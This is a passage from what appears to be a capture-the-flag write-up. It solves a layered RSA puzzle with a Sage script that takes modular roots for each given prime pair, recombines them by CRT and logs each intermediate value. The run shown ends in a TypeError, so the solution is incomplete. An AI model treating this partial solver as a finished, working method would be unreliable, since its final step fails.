class="number">5952590790902091635268726673538951527433355660839816621733964706901441977862333411532558667717227</span></span><br><span class="line">q25 = <span class="number">7541333580839789645678699855290145212677767915429008863004397257213367753100058966625356835737037</span></span><br><span class="line">p24 = <span class="number">14702310219802004876082313481498680940324963613770096574742182597840558294030859405666549879531</span></span><br><span class="line">q24 = <span class="number">15115713372931874518523751684548940147062395364112500028355694776530968944848166318295947674571</span></span><br><span class="line">p23 = <span class="number">43870497594014737833600078975099212558645315030912084285417550950854483979406797450479252891</span></span><br><span class="line">q23 = <span class="number">59471978701477648587546053450213894562580907285714122639903144859545186463681183925646967041</span></span><br><span class="line">p22 = <span class="number">206721456778089912780641186795393376537372828449722520397829606593267585681448641482345737</span></span><br><span class="line">q22 = <span class="number">212549643149353357950643557614966235999942509894271006476145929120541407503538644651435909</span></span><br><span class="line">p21 = <span class="number">368461902207817023013078031477042541053987571003677386333567043030477451518424731838173</span></span><br><span class="line">q21 = <span class="number">428750921047556327595864876619292414694543668237320723518704707914310601565770504401619</span></span><br><span class="line">p20 = <span class="number">1328165608715012145707239303399129070657427496129541416861187541092152796676371237057</span></span><br><span class="line">q20 = <span class="number">1692196606246085729483398884059069884182535824953762329164855466589577530953493347747</span></span><br><span class="line">p19 = <span class="number">4479430800690915874719403516331677127806963529247809966024777708496270901092401687</span></span><br><span class="line">q19 = <span class="number">5467527956822382309398095704409409074818664888285375307055715842283183939297839923</span></span><br><span class="line">p18 = <span class="number">15874438801602936764330936047390981280096007684699625987478211613419079727910193</span></span><br><span class="line">q18 = <span class="number">26984206512970181742033712455904984758134288864531714209886622060356697128804201</span></span><br><span class="line">p17 = <span class="number">102366458668689911004027849640392002821642295855327735994412634235696717329671</span></span><br><span class="line">q17 = <span class="number">104379442774418262390337411577160146519860415840398189010112686742489182665577</span></span><br><span class="line">p16 = <span class="number">262775599542220820608778738911414710660835549772895468394761119434220071003</span></span><br><span class="line">q16 = <span class="number">317277895959173163347650321012213555955385929418622006880521870012130207557</span></span><br><span class="line">p15 = <span class="number">2623629589005115152329094552749299711026240699896424120660145647226563547</span></span><br><span class="line">q15 = <span class="number">3200631836176555526009533059891690177091538103904679780020639896015937897</span></span><br><span class="line">p14 = <span class="number">11136261905010083405430254612464029672882837025885682392810368001188527</span></span><br><span class="line">q14 = <span class="number">12445294229358634680867170058509842935273054334385354032543323581223253</span></span><br><span class="line">p13 = <span class="number">43449898447639409732732812916430042263570178747794530133229640125923</span></span><br><span class="line">q13 = <span class="number">46014074200352892806829193743016415423205917845271691428043440245531</span></span><br><span class="line">p12 = <span class="number">66882708962198932251728043152245270662769508317424500666902658099</span></span><br><span class="line">q12 = <span class="number">103424977238409568447978495499643051307907366367259219393937014631</span></span><br><span class="line">p11 = <span class="number">350121371461894793578110243222665782247737840410076591434903787</span></span><br><span class="line">q11 = <span class="number">367712839396521757736384350030802803477965822058616833553305103</span></span><br><span class="line">p10 = <span class="number">954412804126450754097808991490470782833291028309980575506163</span></span><br><span class="line">q10 = <span class="number">1567597041534155679238655992215022394597376421096298363211067</span></span><br><span class="line">p9 = <span class="number">6623023178993627032758350846838617937710601663528839184727</span></span><br><span class="line">q9 = <span class="number">9419832152875820180139633405089278278408407453522978357309</span></span><br><span class="line">p8 = <span class="number">37185691759470013533730603170661686570987787098353146897</span></span><br><span class="line">q8 = <span class="number">41680117092754807988080699273322244961911189757589699867</span></span><br><span class="line">p7 = <span class="number">135813272566456906193934636644217527100917542578856697</span></span><br><span class="line">q7 = <span class="number">140758317578347635848563045232314610161039815135897421</span></span><br><span class="line">p6 = <span class="number">385788223643735590500185001710758495904528462058461</span></span><br><span class="line">q6 = <span class="number">576581905150085393327734090419529952232186498060949</span></span><br><span class="line">p5 = <span class="number">1656848589754467667368312855929759764100120657831</span></span><br><span class="line">q5 = <span class="number">2714357008989072105081411295741540337141142641741</span></span><br><span class="line">p4 = <span class="number">7832299017937880395583715032476962329929226581</span></span><br><span class="line">q4 = <span class="number">10726403821316775206273675267109184566904426261</span></span><br><span class="line">p3 = <span class="number">24335212484189159197840692460327461505035059</span></span><br><span class="line">q3 = <span class="number">43974782968656404951924524450501283426052127</span></span><br><span class="line">p2 = <span class="number">88067722275537586769787599991567203589751</span></span><br><span class="line">q2 = <span class="number">88380889077762105057154017276462714444697</span></span><br><span class="line">p1 = <span class="number">232079231415308325450092906880606082069</span></span><br><span class="line">q1 = <span class="number">295185057334340451492588650872876746227</span></span><br><span class="line">p0 = <span class="number">953730950786751671162019537171974567</span></span><br><span class="line">q0 = <span class="number">1189933229053113361422958527792232151</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def solve(p, q, c, e, n_):</span><br><span class="line"></span><br><span class="line">    P.&lt;a&gt;= PolynomialRing(Zmod(p), implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">    f = a ^ e - c</span><br><span class="line">    mps = f.monic().roots()</span><br><span class="line"></span><br><span class="line">    P.&lt;a&gt;= PolynomialRing(Zmod(q), implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">    g = a ^ e - c</span><br><span class="line">    mqs = g.monic().roots()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> mpp in mps:</span><br><span class="line">        x = mpp[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> mqq in mqs:</span><br><span class="line">            y = mqq[<span class="number">0</span>]</span><br><span class="line">            solution = CRT_list([<span class="keyword">int</span>(x), <span class="keyword">int</span>(y)], [p, q])</span><br><span class="line">            <span class="keyword">if</span> solution &lt; n_:</span><br><span class="line">                solutions.append(solution)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = []</span><br><span class="line">q = []</span><br><span class="line">n_ = []</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">0</span>, <span class="number">27</span>):</span><br><span class="line">    solutions = []</span><br><span class="line">    i = <span class="number">26</span> - i</span><br><span class="line">    print(i)</span><br><span class="line">    print(<span class="string">&quot;c&quot;</span>, c)</span><br><span class="line">    eval(<span class="string">&quot;p.append(p&#123;0&#125;)&quot;</span>.format(i))</span><br><span class="line">    print(<span class="string">&#x27;p&#x27;</span>,p[<span class="number">-1</span>])</span><br><span class="line">    eval(<span class="string">&quot;q.append(q&#123;0&#125;)&quot;</span>.format(i))</span><br><span class="line">    print(<span class="string">&#x27;q&#x27;</span>, q[<span class="number">-1</span>])</span><br><span class="line">    eval(<span class="string">&quot;n_.append(n&#123;0&#125;)&quot;</span>.format(i<span class="number">-1</span>))</span><br><span class="line">    print(<span class="string">&quot;上一个n&quot;</span>, n_[<span class="number">-1</span>])</span><br><span class="line">    solve(p[<span class="number">-1</span>], q[<span class="number">-1</span>], c, e, n_[<span class="number">-1</span>])</span><br><span class="line">    print(solutions)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">21</span>:</span><br><span class="line">        c = solutions[<span class="number">0</span>]</span><br><span class="line">    elif i==<span class="number">9</span>:</span><br><span class="line">        c = solutions[<span class="number">-2</span>]</span><br><span class="line">    elif i==<span class="number">5</span>:</span><br><span class="line">        c = solutions[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        c = solutions[<span class="number">-1</span>]</span><br><span class="line">    print()</span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure>

<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><span class="line"># 输出数据</span><br><span class="line">26</span><br><span class="line">c 1028324919038104683475485759234995158466543298184637219012354053883391759172761125802189697762778242175407876548832454351014064525118465877297277847501477586955680645311999174005606833294172830817159</span><br><span class="line"><span class="selector-tag">p</span> 978009050697262759337388871320370165458800566798280419667959552859180906066907114053826258140106617</span><br><span class="line"><span class="selector-tag">q</span> 1086686910531802445146659484012613083647370307628438760118376029969836222533970554565751069314622539</span><br><span class="line">上一个n 44890472824427626252451120059527486677662371033945481542195354255473403815853320591468917295474578271680865394304946847791535710766947049195816261224382109115684638995528332538466194474846836399</span><br><span class="line"><span class="selector-attr">[34477005676820162206313524350718388995388964361111914461122792945404747258640626572519670215765749828347378102656628531443002193905830917576501911098980764185815997345702819264240009751148442426]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">25</span><br><span class="line">c 34477005676820162206313524350718388995388964361111914461122792945404747258640626572519670215765749828347378102656628531443002193905830917576501911098980764185815997345702819264240009751148442426</span><br><span class="line"><span class="selector-tag">p</span> 5952590790902091635268726673538951527433355660839816621733964706901441977862333411532558667717227</span><br><span class="line"><span class="selector-tag">q</span> 7541333580839789645678699855290145212677767915429008863004397257213367753100058966625356835737037</span><br><span class="line">上一个n 222235907202454132555071455958700740228567465616560859711214102245461514428187391909176054661864893645713338391509536653547350134615807194339839952004333949540567943568810413945779642106201</span><br><span class="line"><span class="selector-attr">[122251474355770407049299923720807002619294038964768766444097932240736660221208587524190952184175408395327264273947998924572358674189845633957638043199338228060748873522292564061697159084155]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">24</span><br><span class="line">c 122251474355770407049299923720807002619294038964768766444097932240736660221208587524190952184175408395327264273947998924572358674189845633957638043199338228060748873522292564061697159084155</span><br><span class="line"><span class="selector-tag">p</span> 14702310219802004876082313481498680940324963613770096574742182597840558294030859405666549879531</span><br><span class="line"><span class="selector-tag">q</span> 15115713372931874518523751684548940147062395364112500028355694776530968944848166318295947674571</span><br><span class="line">上一个n 2609065298534470914730686454716224905333131812890643378630636043224255484662185236061585264231004975072801053316107165770342161619265243081616632312934742288262985830181883449780965531</span><br><span class="line"><span class="selector-attr">[2302982988306130873718678248046965635619977122378875400979845776887964102490919700970705411214473299613671701762260147495040038609477011076066320527267277326015932285789720472919789158]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">23</span><br><span class="line">c 2302982988306130873718678248046965635619977122378875400979845776887964102490919700970705411214473299613671701762260147495040038609477011076066320527267277326015932285789720472919789158</span><br><span class="line"><span class="selector-tag">p</span> 43870497594014737833600078975099212558645315030912084285417550950854483979406797450479252891</span><br><span class="line"><span class="selector-tag">q</span> 59471978701477648587546053450213894562580907285714122639903144859545186463681183925646967041</span><br><span class="line">上一个n 43938571869497484913682975192955012614794498816057204091016374302341854100775132924321569876797699342959191646206571444845883942305710956894334106963321644724361549027630634869933</span><br><span class="line"><span class="selector-attr">[23537451475264654783397519677185909863292665248941544646127041892810699254693157668878272163047447965494360147684605330696871807540713768499564637999043110095219692999410680226995]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">22</span><br><span class="line">c 23537451475264654783397519677185909863292665248941544646127041892810699254693157668878272163047447965494360147684605330696871807540713768499564637999043110095219692999410680226995</span><br><span class="line"><span class="selector-tag">p</span> 206721456778089912780641186795393376537372828449722520397829606593267585681448641482345737</span><br><span class="line"><span class="selector-tag">q</span> 212549643149353357950643557614966235999942509894271006476145929120541407503538644651435909</span><br><span class="line">上一个n 157978379942536176944325875241196121764116712487226808271002140500926678942090491383544034591205964958130852055691446362753906164711087278555153881606839791499207025307202087</span><br><span class="line"><span class="selector-attr">[140177373424899679430074829392928313477693819706173332758040927339401517742208025981523425936186925200196496612125625456430631622632150834127049737384042503028994857458226467]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">21</span><br><span class="line">c 140177373424899679430074829392928313477693819706173332758040927339401517742208025981523425936186925200196496612125625456430631622632150834127049737384042503028994857458226467</span><br><span class="line"><span class="selector-tag">p</span> 368461902207817023013078031477042541053987571003677386333567043030477451518424731838173</span><br><span class="line"><span class="selector-tag">q</span> 428750921047556327595864876619292414694543668237320723518704707914310601565770504401619</span><br><span class="line">上一个n 2247517335600310176909964109060502815240207684510918447209767597511414934626668616704865548059751008841620288545344598917362752622130186820039265603312354963258673860579</span><br><span class="line"><span class="selector-attr">[963130018196161068022561826136699615972631158326273266709450636152057794259408910239684181019014240059847446622341252471979045951190123708301480386597157821916163544334, 219785508612613802216451325231684154232671610129643237209951549593627718088951326786938561835919852060454295291676893330256385004619027744244112309090521216117612270955]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">20</span><br><span class="line">c 963130018196161068022561826136699615972631158326273266709450636152057794259408910239684181019014240059847446622341252471979045951190123708301480386597157821916163544334</span><br><span class="line"><span class="selector-tag">p</span> 1328165608715012145707239303399129070657427496129541416861187541092152796676371237057</span><br><span class="line"><span class="selector-tag">q</span> 1692196606246085729483398884059069884182535824953762329164855466589577530953493347747</span><br><span class="line">上一个n 24491413133428851306933688733518898516890217803647806829002775935975741568422047344206442746983871735723486865901743352102305801200224958166496937663406627341150101</span><br><span class="line"><span class="selector-attr">[22099780396461829722379389411334090279609060431701121609182515723815260652756755053990706324709932514832032225698612585831935469922880299786763383240418382919799321]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">19</span><br><span class="line">c 22099780396461829722379389411334090279609060431701121609182515723815260652756755053990706324709932514832032225698612585831935469922880299786763383240418382919799321</span><br><span class="line"><span class="selector-tag">p</span> 4479430800690915874719403516331677127806963529247809966024777708496270901092401687</span><br><span class="line"><span class="selector-tag">q</span> 5467527956822382309398095704409409074818664888285375307055715842283183939297839923</span><br><span class="line">上一个n 428359134899960532964729749713513106760306719712194950954567619156985067322564731294653991204666853689688900339268764469280769569535109069729404621290809120793</span><br><span class="line"><span class="selector-attr">[339872121965407658932035525463686156827750242931688944610910333924021823802853041665508873405457522819631217022111208112413457553033499000314226547656845920264, 105203615092085867196180713024031580953262645244470745062806287628728083957360817366488801411967688912343820375347382249694217193012009121220949533257603223298]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">18</span><br><span class="line">c 105203615092085867196180713024031580953262645244470745062806287628728083957360817366488801411967688912343820375347382249694217193012009121220949533257603223298</span><br><span class="line"><span class="selector-tag">p</span> 15874438801602936764330936047390981280096007684699625987478211613419079727910193</span><br><span class="line"><span class="selector-tag">q</span> 26984206512970181742033712455904984758134288864531714209886622060356697128804201</span><br><span class="line">上一个n 10684953914628370830889219903654707140968094024767031366624595731918523435466123514094659595357231410471738736952266383928737163485550013190959149252435167</span><br><span class="line"><span class="selector-attr">[2770807474173138559681583722575063626632396109101990628426422882126692567611876893424492013746533498499436328221834686503730687608977519563790607788117242]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">17</span><br><span class="line">c 2770807474173138559681583722575063626632396109101990628426422882126692567611876893424492013746533498499436328221834686503730687608977519563790607788117242</span><br><span class="line"><span class="selector-tag">p</span> 102366458668689911004027849640392002821642295855327735994412634235696717329671</span><br><span class="line"><span class="selector-tag">q</span> 104379442774418262390337411577160146519860415840398189010112686742489182665577</span><br><span class="line">上一个n 83372889332166088651413254885376085265561130214754686361784964744744711092668473281132249352040520639092871294276293287744276919265091479681667169671</span><br><span class="line"><span class="selector-attr">[79522563507420097241671540749267415107213223614814036174487708662964551801437232540659877853816396875693921978483029788328787752167530021794795431857]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">16</span><br><span class="line">c 79522563507420097241671540749267415107213223614814036174487708662964551801437232540659877853816396875693921978483029788328787752167530021794795431857</span><br><span class="line"><span class="selector-tag">p</span> 262775599542220820608778738911414710660835549772895468394761119434220071003</span><br><span class="line"><span class="selector-tag">q</span> 317277895959173163347650321012213555955385929418622006880521870012130207557</span><br><span class="line">上一个n 8397272388904583425531462714999219642572091279898695377838194583995214737828538895164195817973441184775814069396690436662985593377966417476040659</span><br><span class="line"><span class="selector-attr">[5740430010013684628644551879825046012734679272445242381620481408471916167301047890256368008799418782647448496772184916399177933499460690370459556, 2037298899016874045219277999643220063198097234557335235921481885211253636813115803603315238074035822211603707964528777576900935877949510316646223]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">15</span><br><span class="line">c 2037298899016874045219277999643220063198097234557335235921481885211253636813115803603315238074035822211603707964528777576900935877949510316646223</span><br><span class="line"><span class="selector-tag">p</span> 2623629589005115152329094552749299711026240699896424120660145647226563547</span><br><span class="line"><span class="selector-tag">q</span> 3200631836176555526009533059891690177091538103904679780020639896015937897</span><br><span class="line">上一个n 138594056023048386926766329537127538558164718841925506735112367176642328352257472034381662493666299220910783237918231719166519833124529218331</span><br><span class="line"><span class="selector-attr">[91620534205913166538263094639686621545207290194630647497982781366417941090195313655420047805846906050555821244135842146392017800438719304994]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">14</span><br><span class="line">c 91620534205913166538263094639686621545207290194630647497982781366417941090195313655420047805846906050555821244135842146392017800438719304994</span><br><span class="line"><span class="selector-tag">p</span> 11136261905010083405430254612464029672882837025885682392810368001188527</span><br><span class="line"><span class="selector-tag">q</span> 12445294229358634680867170058509842935273054334385354032543323581223253</span><br><span class="line">上一个n 1999306851167477770905800721615579416365273707414308684419794311809177595829473632853128686208533753019224536487399393397120864878000113</span><br><span class="line"><span class="selector-attr">[634223615344447851225076194238185184332604736515528218505996221339671015125769748828654573318605955936504358040759056745442253727290998]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">13</span><br><span class="line">c 634223615344447851225076194238185184332604736515528218505996221339671015125769748828654573318605955936504358040759056745442253727290998</span><br><span class="line"><span class="selector-tag">p</span> 43449898447639409732732812916430042263570178747794530133229640125923</span><br><span class="line"><span class="selector-tag">q</span> 46014074200352892806829193743016415423205917845271691428043440245531</span><br><span class="line">上一个n 6917342652058596217869122177298094984415751234677039849514181349685079073411591975537016273056773954075238307918266361998553646469</span><br><span class="line"><span class="selector-attr">[1151747077760886031968395300122212971249677857649906015143598211944659498637807719069388997270109028927478629593266598515428543599]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">12</span><br><span class="line">c 1151747077760886031968395300122212971249677857649906015143598211944659498637807719069388997270109028927478629593266598515428543599</span><br><span class="line"><span class="selector-tag">p</span> 66882708962198932251728043152245270662769508317424500666902658099</span><br><span class="line"><span class="selector-tag">q</span> 103424977238409568447978495499643051307907366367259219393937014631</span><br><span class="line">上一个n 128744123633657656499069966444992201456797762973822340505291131642660343436783413140023509983315177426811890315424928661125061</span><br><span class="line"><span class="selector-attr">[4885555691619901252961116690244561429850119193038756404218077274265730135140315447675335151534535632576283303735514949638673]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">11</span><br><span class="line">c 4885555691619901252961116690244561429850119193038756404218077274265730135140315447675335151534535632576283303735514949638673</span><br><span class="line"><span class="selector-tag">p</span> 350121371461894793578110243222665782247737840410076591434903787</span><br><span class="line"><span class="selector-tag">q</span> 367712839396521757736384350030802803477965822058616833553305103</span><br><span class="line">上一个n 1496134688150941811618178638810353297864345150241986530472328508974364124440160181353848429438725939837967063441528305921</span><br><span class="line"><span class="selector-attr">[441483827088168645513094641426499891374571558703981036806090540801685962515269086990244001450093104554187188047355883908]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">10</span><br><span class="line">c 441483827088168645513094641426499891374571558703981036806090540801685962515269086990244001450093104554187188047355883908</span><br><span class="line"><span class="selector-tag">p</span> 954412804126450754097808991490470782833291028309980575506163</span><br><span class="line"><span class="selector-tag">q</span> 1567597041534155679238655992215022394597376421096298363211067</span><br><span class="line">上一个n 62387766690725996279968636478698222263235233511074646032501495855928095611796694112573478405813305623307157261619643</span><br><span class="line"><span class="selector-attr">[50746207344403804443969898876160025928774123141871973214027095925794652197169084777221214441362057146919986427284274]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">9</span><br><span class="line">c 50746207344403804443969898876160025928774123141871973214027095925794652197169084777221214441362057146919986427284274</span><br><span class="line"><span class="selector-tag">p</span> 6623023178993627032758350846838617937710601663528839184727</span><br><span class="line"><span class="selector-tag">q</span> 9419832152875820180139633405089278278408407453522978357309</span><br><span class="line">上一个n 1549903986709797721131070830901667744892392382636347158789834851868638863292232718716074359148785900673192362699</span><br><span class="line"><span class="selector-attr">[657107719500394822892028354527169935943474820140535753753542512969310979794098072396859652456232677935960563842, 851834034713920072016294826766890940103178167607817794715692270318536007164857863881508649769981422663639184163, 527047155800840593369140310256885301274622245610009509121333858627158271116419456151449561049622379237851374997]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">8</span><br><span class="line">c 851834034713920072016294826766890940103178167607817794715692270318536007164857863881508649769981422663639184163</span><br><span class="line"><span class="selector-tag">p</span> 37185691759470013533730603170661686570987787098353146897</span><br><span class="line"><span class="selector-tag">q</span> 41680117092754807988080699273322244961911189757589699867</span><br><span class="line">上一个n 19116847751264029874551971240684579996570601026679560309305369168779130317938356692609176166515369250878437</span><br><span class="line"><span class="selector-attr">[5772224180179962397158418478468305994920422145855450551932850591253169055736728137194928021864521464661511]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">7</span><br><span class="line">c 5772224180179962397158418478468305994920422145855450551932850591253169055736728137194928021864521464661511</span><br><span class="line"><span class="selector-tag">p</span> 135813272566456906193934636644217527100917542578856697</span><br><span class="line"><span class="selector-tag">q</span> 140758317578347635848563045232314610161039815135897421</span><br><span class="line">上一个n 222438508972972285373674471797570608108219830357859030918870564627162064662598790037437036093579139489</span><br><span class="line"><span class="selector-attr">[201270414263671865648131358230135006175090857068415686069148837994386901812348962669414590276244279652]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">6</span><br><span class="line">c 201270414263671865648131358230135006175090857068415686069148837994386901812348962669414590276244279652</span><br><span class="line"><span class="selector-tag">p</span> 385788223643735590500185001710758495904528462058461</span><br><span class="line"><span class="selector-tag">q</span> 576581905150085393327734090419529952232186498060949</span><br><span class="line">上一个n 4497278582433699034700211877087309784829036823057043402314297478185216205338241432310114079123771</span><br><span class="line"><span class="selector-attr">[1631195497375922229848480131202350147418728908365651197102485655617240528564830722486663140830762]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">5</span><br><span class="line">c 1631195497375922229848480131202350147418728908365651197102485655617240528564830722486663140830762</span><br><span class="line"><span class="selector-tag">p</span> 1656848589754467667368312855929759764100120657831</span><br><span class="line"><span class="selector-tag">q</span> 2714357008989072105081411295741540337141142641741</span><br><span class="line">上一个n 84012402115704505952834528733063574032699054524475028392540927197962976150657887637275643641</span><br><span class="line"><span class="selector-attr">[83436593835736927783034931301466249878138772728555530531816534785622373800125814331410735801, 541028901037423648292648425333532314938480435681509712968388151546772635406670001849006961]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">4</span><br><span class="line">c 83436593835736927783034931301466249878138772728555530531816534785622373800125814331410735801</span><br><span class="line"><span class="selector-tag">p</span> 7832299017937880395583715032476962329929226581</span><br><span class="line"><span class="selector-tag">q</span> 10726403821316775206273675267109184566904426261</span><br><span class="line">上一个n 1070135687488356161164202697449500843725645617129661751744246979913699130211505096520493</span><br><span class="line"><span class="selector-attr">[612402625116056383171913080691265536933185153779141510100715847406642891544437819056399]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3</span><br><span class="line">c 612402625116056383171913080691265536933185153779141510100715847406642891544437819056399</span><br><span class="line"><span class="selector-tag">p</span> 24335212484189159197840692460327461505035059</span><br><span class="line"><span class="selector-tag">q</span> 43974782968656404951924524450501283426052127</span><br><span class="line">上一个n 7783503593765446343363083302704731608384677185199537317445372251030064778965500447</span><br><span class="line"><span class="selector-attr">[7523449601904104920623925101649366402016181450187359849499567637389273313904203215]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2</span><br><span class="line">c 7523449601904104920623925101649366402016181450187359849499567637389273313904203215</span><br><span class="line"><span class="selector-tag">p</span> 88067722275537586769787599991567203589751</span><br><span class="line"><span class="selector-tag">q</span> 88380889077762105057154017276462714444697</span><br><span class="line">上一个n 68506321231437453734007374706367120760326482177047006099953454136095248103663</span><br><span class="line"><span class="selector-attr">[23388304805925808822689623463866376122782272519632037291479310043364093060855]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">c 23388304805925808822689623463866376122782272519632037291479310043364093060855</span><br><span class="line"><span class="selector-tag">p</span> 232079231415308325450092906880606082069</span><br><span class="line"><span class="selector-tag">q</span> 295185057334340451492588650872876746227</span><br><span class="line">上一个n 1134876149917575363176366704410565158549594427794901202977560677131703617</span><br><span class="line"><span class="selector-attr">[53296318153341311013989348488093143123693921875654781175946491674187297]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0</span><br><span class="line">c 53296318153341311013989348488093143123693921875654781175946491674187297</span><br><span class="line"><span class="selector-tag">p</span> 953730950786751671162019537171974567</span><br><span class="line"><span class="selector-tag">q</span> 1189933229053113361422958527792232151</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">TypeError                                 Traceback (most recent call last)</span><br><span class="line">&lt;ipython-<span class="selector-tag">input</span>-39-193924cf64b6&gt; in &lt;module&gt;</span><br><span class="line">    119     eval(&quot;q.append(q&#123;<span class="number">0</span>&#125;)&quot;<span class="selector-class">.format</span>(i))</span><br><span class="line">    120     print(&#x27;q&#x27;, 